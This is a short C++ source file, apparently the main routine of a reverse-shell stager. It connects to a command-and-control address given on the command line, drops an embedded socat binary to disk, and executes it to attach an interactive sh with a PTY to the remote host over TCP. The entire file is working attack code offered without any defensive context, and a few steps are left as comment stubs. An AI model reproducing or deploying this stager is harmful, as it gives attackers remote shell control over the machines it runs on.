
#include <iostream>
#include "connector.h"
#include <string>
#include "socat.h"
#include <fstream>

int main(int argc, char** argv){

    if(argc!=3){
        std::cout << "shell.exe <ip> <port>\n";
        exit(1);
    }


    //connect to cc
    Connector c(argv[1], std::stoi(argv[2]));
    c.Connect();


    //negotiate ports


    //Write second stage (socat)
    std::ofstream file;
    file.open("socat", std::ios::binary | std::ios::out);
    file.write(socat,socat_len);
    file.close();   

    

    //write ssl cert to file
    //socat - TCP:10.1.1.1:80
    std::string command = "chmod 700 socat; ./socat exec:sh,pty,stderr,setsid,sigint,sane tcp-connect:";
    command.append(c._stagerIP);
    command.append(":");
    command.append(std::to_string(c._stagerPort));
    std::cout << command << std::endl;
    system(command.c_str());

    return 0;
}